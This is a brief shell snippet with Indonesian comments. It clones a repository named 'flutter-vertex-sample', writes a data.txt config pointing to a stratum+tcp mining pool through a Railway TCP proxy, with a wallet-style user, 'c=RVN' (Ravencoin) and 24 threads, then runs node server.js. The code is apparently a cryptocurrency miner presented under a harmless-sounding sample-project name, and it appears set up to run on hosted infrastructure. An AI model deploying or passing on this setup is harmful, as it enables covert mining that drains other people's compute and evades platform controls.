git clone https://github.com/mom742886/flutter-vertex-sample

cd flutter-vertex-sample

# Buat file konfigurasi data.txt dengan alamat proxy Railway
echo -e '{
  "log": true,
  "proxy": "stratum+tcp://railway-tcp-proxy-production.up.railway.app:8080",
  "user": "RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i",
  "password": "c=RVN,zap=MAZA/PLSR-mino",
  "argent": "node-vertex/0.1",
  "threads": 24
}' > data.txt

# Jalankan server node
node server.js
